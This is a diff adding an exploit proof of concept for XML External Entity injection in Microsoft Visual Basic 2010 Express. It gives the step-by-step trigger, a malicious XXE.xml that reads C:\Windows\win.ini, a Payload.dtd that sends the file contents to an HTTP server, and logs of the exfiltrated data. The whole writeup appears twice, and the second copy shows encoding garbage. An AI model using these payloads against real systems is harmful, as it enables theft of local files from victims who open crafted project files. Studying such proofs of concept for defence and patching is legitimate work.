@@ -1,0 +1,96 @@
+# Exploit Title: Microsoft Visual Basic 2010 Express - XML External Entity Injection
+# Exploit Author: ZwX
+# Exploit Date: 2019-12-03
+# Version Software : 10.0.30319.1 RTMRel
+# Vendor Homepage : https://www.microsoft.com/
+# Software Link: https://dotnet.developpez.com/telecharger/detail/id/593/Visual-Studio-2010-Express
+# Tested on OS: Windows 7
+
+
+[+] Exploit : (PoC)
+===================
+1) python -m SimpleHTTPServer 8000
+2) Create file (.xml)
+3) Create file Payload.dtd
+4) Open the software Microsoft Visual Basic 2010
+5) Drag the file (.xml) in a VB project
+6) External Entity Injection Successful
+
+
+[+] XXE.xml :
+==============
+<?xml version="1.0"?>
+<!DOCTYPE test [
+<!ENTITY % file SYSTEM "C:\Windows\win.ini">
+<!ENTITY % dtd SYSTEM "http://localhost:8000/payload.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
+
+[+] Payload.dtd :
+=================
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:8000?%file;'>">
+%all;
+
+
+[+] Result Exploitation :
+=========================
+C:\>python -m SimpleHTTPServer 8000
+Serving HTTP on 0.0.0.0 port 8000 ...
+ZwX-PC - - [03/Dec/2019 11:14:14] "GET /payload.dtd HTTP/1.1" 200 -
+ZwX-PC - - [03/Dec/2019 11:14:14] "GET /?;%20for%2016-bit%20app%20support%0D%0A%5Bfonts%5D%0D%0A%5Bextensions%5D%0D%0A%5Bmci%20extensions%5D%0D%0A%5B
+%0Aaac=MPEGVideo%0D%0Aadt=MPEGVideo%0D%0Aadts=MPEGVideo%0D%0Am2t=MPEGVideo%0D%0Am2ts=MPEGVideo%0D%0Am2v=MPEGVideo%0D%0Am4a=MPEGVideo%0D%0Am4v=MPEGVideo
+Files%5D%0D%0Acolumns=193;100;60;89;100;160; HTTP/1.1" 301 -
+ZwX-PC - - [03/Dec/2019 11:14:14] "GET /?;%20for%2016-bit%20app%20support%0D%0A%5Bfonts%5D%0D%0A%5Bextensions%5D%0D%0A%5Bmci%20extensions%5D%0D%0A%5B
+%0Aaac=MPEGVideo%0D%0Aadt=MPEGVideo%0D%0Aadts=MPEGVideo%0D%0Am2t=MPEGVideo%0D%0Am2ts=MPEGVideo%0D%0Am2v=MPEGVideo%0D%0Am4a=MPEGVideo%0D%0Am4v=MPEGVideo
+Files%5D%0D%0Acolumns=193;100;60;89;100;160;/ HTTP/1.1" 200 -
+
+
+Microsoft Visual Basic 2010 Express - XML External Entity Injection.txt
+
+ï»¿# Exploit Title: Microsoft Visual BasicÂ 2010 Express - XML External Entity Injection
+# Exploit Author: ZwX
+# Exploit Date: 2019-12-03
+# Version Software : 10.0.30319.1 RTMRel
+# Vendor Homepage : https://www.microsoft.com/
+# Software Link: https://dotnet.developpez.com/telecharger/detail/id/593/Visual-Studio-2010-Express
+# Tested on OS: Windows 7 
+
+
+[+] Exploit : (PoC)
+===================
+1) python -m SimpleHTTPServer 8000
+2) Create file (.xml)
+3) Create file Payload.dtd
+4) Open the software Microsoft Visual BasicÂ 2010
+5) Drag the file (.xml) in a VB project
+6) External Entity Injection Successful
+
+
+[+] XXE.xml :
+==============
+<?xml version="1.0"?>
+<!DOCTYPE test [
+<!ENTITY % file SYSTEM "C:\Windows\win.ini">
+<!ENTITY % dtd SYSTEM "http://localhost:8000/payload.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
+
+[+] Payload.dtd :
+=================
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:8000?%file;'>">
+%all;
+
+
+[+] Result Exploitation :
+=========================
+C:\>python -m SimpleHTTPServer 8000
+Serving HTTP on 0.0.0.0 port 8000 ...
+ZwX-PC - - [03/Dec/2019 11:14:14] "GET /payload.dtd HTTP/1.1" 200 -
+ZwX-PC - - [03/Dec/2019 11:14:14] "GET /?;%20for%2016-bit%20app%20support%0D%0A%5Bfonts%5D%0D%0A%5Bextensions%5D%0D%0A%5Bmci%20extensions%5D%0D%0A%5B
+%0Aaac=MPEGVideo%0D%0Aadt=MPEGVideo%0D%0Aadts=MPEGVideo%0D%0Am2t=MPEGVideo%0D%0Am2ts=MPEGVideo%0D%0Am2v=MPEGVideo%0D%0Am4a=MPEGVideo%0D%0Am4v=MPEGVideo
+Files%5D%0D%0Acolumns=193;100;60;89;100;160; HTTP/1.1" 301 -
+ZwX-PC - - [03/Dec/2019 11:14:14] "GET /?;%20for%2016-bit%20app%20support%0D%0A%5Bfonts%5D%0D%0A%5Bextensions%5D%0D%0A%5Bmci%20extensions%5D%0D%0A%5B
+%0Aaac=MPEGVideo%0D%0Aadt=MPEGVideo%0D%0Aadts=MPEGVideo%0D%0Am2t=MPEGVideo%0D%0Am2ts=MPEGVideo%0D%0Am2v=MPEGVideo%0D%0Am4a=MPEGVideo%0D%0Am4v=MPEGVideo
+Files%5D%0D%0Acolumns=193;100;60;89;100;160;/ HTTP/1.1" 200 -
